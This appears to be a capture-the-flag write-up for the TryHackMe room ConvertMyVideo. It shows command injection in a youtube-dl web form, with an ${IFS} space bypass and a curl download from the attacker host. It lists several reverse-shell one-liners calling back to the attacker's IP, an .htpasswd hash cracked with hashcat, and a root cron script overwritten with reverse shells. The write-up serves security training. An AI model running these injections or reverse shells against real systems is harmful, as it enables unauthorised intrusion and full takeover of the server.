---
title: "Convert My Video TryHackMe Write Up"
last_modified_at: 2020-11-25T10:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - linux
  - convertmyvideo
  - web
  - command injection
  - youtube downloader
  - privilege escalation
  - cronjob misconfiguration
---

<img alt="convert" src="/assets/images/thm/convertmyvideo/convert.png" width="200px" height="50px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[ConvertMyVideo](https://tryhackme.com/room/convertmyvideo) is a medium rated room in TryHackMe by [overjt](https://tryhackme.com/p/overjt). We use command injection to get a shell on the box as user www-data and use misconfigured cron running as root to get the root shell on the box.

# Port Scan
### All Port Scan
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nmap -p- --min-rate 10000 -v -oN all-ports 10.10.226.205
Nmap scan report for 10.10.226.205
Host is up (0.44s latency).
Not shown: 62885 closed ports, 2648 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Nov 25 15:04:35 2020 -- 1 IP address (1 host up) scanned in 58.64 seconds
```

### Detail Scan
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nmap -p22,80 -sC -sV -oN detail 10.10.226.205
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-25 15:04 +0545
Nmap scan report for 10.10.226.205
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
```
Only SSH and HTTP service is running on the box.

# HTTP Service on Port 80

![1](/assets/images/thm/convertmyvideo/1.png)

We get a something which asks for video id an looks like it converts the video to the audio. Lets analyse the response on the BurpSuite.

I made a request with video id 1 and checked the response on the burp.

### Request
```html
POST / HTTP/1.1
Host: 10.10.226.205
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 40
Origin: http://10.10.226.205
Connection: close
Referer: http://10.10.226.205/

yt_url=https://www.youtube.com/watch?v=1
```
We can see the id parameter is appended to the youtube url and it makes a post request.

### Response
```html
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 1. URL https:\/\/www.youtube.com\/watch?v=1 looks truncated.\n","url_orginal":"https:\/\/www.youtube.com\/watch?v=1","output":"","result_url":"\/tmp\/downloads\/5fbe2445694fe.mp3"}
```

We get some kind of output. Then I searched the things on the output and found a [github](https://github.com/ytdl-org/youtube-dl) link for the project. It turned out to be a youtube downloader.  

### Hypothesis
```php
    video_url = $_REQUEST['yt_url'];
    echo system('youtube-dl '. video_url . ' --outfile ' . '/tmp/garabge' );
```
This might not be entirely true but I like to imagine what  developer might have done to get what he/she wants. If this is the case, we might be able to inject commands.

# Trying Command injections
### Request
```html
yt_url=`id`
```

### Response
```html
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR:   
 u'uid=33(www-data)'   
  is not a valid URL. Set --default-search \"ytsearch\" (or run  youtube-dl \"ytsearch:uid=33(www-data)\" ) to search YouTube\n","url_orginal":"`id`","output":"","result_url":"\/tmp\/downloads\/5fbe255dee50f.mp3"}
```
And we can see **www-data** on the response which means we can run commands but the problem is that the output doesnot looks to be complete.
As we can execute code, lets try to get a reverse shell.

## Reverse shell as www-data

I first tried to read the files on the webserver to see how all the system is implemented.

### Lisiting files on the webserver
### Request 
```html
yt_url=`ls>/var/www/html/test.txt`
```
Since we the ouput was limited, I directed the content of the result to a file.

### Response
```html
admin
images
index.php
js
style.css
test.txt
tmp
```
Here the intended path was to get the content of **.htpasswd** file, crack the hash and login as admin to get code execution. But I will try to get the reverse shell with the things that we have now.
For that we have to try and execute commands without space as with space we get an error.

### Trying to read index.php
### Request
```html
yt_url=`cat index.php`
```

### Response
```html
{"status":2,"errors":"sh: 1: Syntax error: EOF in backquote substitution\n","url_orginal":"`cat","output":"","result_url":"\/tmp\/downloads\/5fbe292419b34.mp3"}
```
We get a syntax error. We can easily bypass this using  **${IFS}**

### Request
```html
yt_url=`cat${IFS}index.php>/var/www/html/test.txt`
```
### Response
```php
<?php

if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && $_SERVER['REQUEST_METHOD'] === 'POST')
{    
   $yt_url = explode(" ", $_POST["yt_url"])[0];
   $id = uniqid();
   $filename = $id.".%(ext)s";
   $template = '/var/www/html/tmp/downloads/'. $filename;
   $string = ('youtube-dl --extract-audio --audio-format mp3 ' . $yt_url . ' -f 18 -o ' . escapeshellarg($template));

   $descriptorspec = array(
      0 => array("pipe", "r"),  // stdin
      1 => array("pipe", "w"),  // stdout
      2 => array("pipe", "w"),  // stderr
   );
   ....
   ....
   ?>
   ```
   We get the content of index.php.

   Now lets try and get a reverse shell. For that first I would open up a python HTTP server on my local machine with a file with bunch of reverse shell payloads. Then I will download that file on the remote machine and save it on a file on first step and will execute that file on next step.

### Content of shell.sh
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/10.6.31.213/9001 0>&1
```

### Starting a python server
```console
local@local:~/Documents/tryhackme/convertmyvideo$ sudo python3 -m http.server 80
[sudo] password for local: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

## Downloading the file on the remote server
### Request
```html
yt_url=`curl${IFS}10.6.31.213/shell.sh>/var/www/html/shell.sh`
```
And if we check the python server, we get a hit.
```console
local@local:~/Documents/tryhackme/convertmyvideo$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.226.205 - - [25/Nov/2020 15:49:18] "GET /shell.sh HTTP/1.1" 200 -
```

### Listening on our box to catch the reverse shell
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```

### Executing the file on remote server
```html
yt_url=`sh${IFS}/var/www/html/shell.sh`
```

And if we check the netcat listener, we get a shell back.
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.226.205 51028
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
Now this shell is a bit hard to work with as it is not interactive. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. So We have to make this session a interactive session.

## Getting a proper TTY
Now lets get a proper shell with auto completion.
```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
Hit CRTL+z to background the current process and on local box type
```console
local@local:~/Documents/tryhackme/convertmyvideo$ stty raw -echo
```
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```console
www-data@dmv:/var/www/html$  export TERM=xterm
```
Now we have a proper shell.

### Reading user flag
```console
www-data@dmv:/var/www/html$ cd admin
www-data@dmv:/var/www/html/admin$ ls -la
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Nov 25 10:03 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
www-data@dmv:/var/www/html/admin$ cat flag.txt 
flag{0d84****************46ed7}
```
Lets also get the contents of .htpasswd file as it contains the password hash which might be useful as people tend to reuse the password.

### Content in .htpasswd
```console
www-data@dmv:/var/www/html/admin$ cat .htpasswd
<redacted-username>:$apr1$tb*************4.zLKxWj8mc6y/
```
Now, lets try to crack this hash using hashcat.

## Cracking hash using hashcat
### Finding mode for the hash
```console
local@local:~/Documents/tryhackme/convertmyvideo$ hashcat --example-hashes | grep -i apr -B 1
MODE: 1600
TYPE: Apache $apr1$ MD5, md5apr1, MD5 (APR)
HASH: $apr1$62722340$zGjeAwVP2KwY6MtumUI1N/
```
### Cracking the hash
```
local@local:~/Documents/tryhackme/convertmyvideo$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt 
hashcat (v5.1.0) starting...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$tb*************4.zLKxWj8mc6y/:<redacted-password>     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$tb*************4.zLKxWj8mc6y/

```
And the hash is cracked instantly using rockyou.txt.

```
<redacted-username>:<redacted-password>
```
# Privilege Escalation
I uploaded and ran linpeas and also manually looking at the contents of the webserver, and found something interesting.
```console
www-data@dmv:/var/www/html$ cd tmp
www-data@dmv:/var/www/html/tmp$ ls
clean.sh
www-data@dmv:/var/www/html/tmp$ cat clean.sh 
rm -rf downloads
```
It looks like something that the user want to do on a regular basics, so he kept the script here and might be running as a cron. So, to check the processes running, I uploaded a pspy binary on the server using the same python HTTP server.

### Pspy
```console
www-data@dmv:/dev/shm$ wget 10.6.31.213/pspy64
--2020-11-25 10:26:05--  http://10.6.31.213/pspy64
Connecting to 10.6.31.213:80... connected.
HTTP request sent, awaiting response... 200 OK
pspy64                                      100%[===========================================================================================>]   2.94M   467KB/s    in 8.5s    

2020-11-25 10:26:14 (355 KB/s) - 'pspy64' saved [3078592/3078592]
www-data@dmv:/dev/shm$ chmod +x pspy64
www-data@dmv:/dev/shm$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
2020/11/25 10:28:01 CMD: UID=0    PID=1403   | bash /var/www/html/tmp/clean.sh 
2020/11/25 10:28:01 CMD: UID=0    PID=1402   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2020/11/25 10:28:01 CMD: UID=0    PID=1401   | /usr/sbin/CRON -f 
2020/11/25 10:28:01 CMD: UID=0    PID=1404   | bash /var/www/html/tmp/clean.sh
2020/11/25 10:29:01 CMD: UID=0    PID=1417   | /usr/sbin/CRON -f 
2020/11/25 10:29:01 CMD: UID=0    PID=1419   | bash /var/www/html/tmp/clean.sh 
2020/11/25 10:29:01 CMD: UID=0    PID=1418   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
```
If we check these entries, the file clean.sh is executed as root every minute. So if we can modify that file, we can get code execution on the box as root.

### Checking the file permissions
```console
www-data@dmv:/var/www/html/tmp$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Nov 25 10:17 ..
-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh
```
And it turned out we are the owner of the file and can change the file content.

### New contents of the clean.sh
```console
www-data@dmv:/var/www/html/tmp$ cat clean.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

bash -i >& /dev/tcp/10.6.31.213/9001 0>&1
```
### Listening on our local box
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```
Now, we wait for the cron to execute the file.
If we check the netcat listner after a while, we can see that we get a connection back and a shell.
```console
local@local:~/Documents/tryhackme/convertmyvideo$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.26.87 51218
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Reading Root flag
```console
# cat /root/root.txt
flag{d9b368*************9c5e94a}
```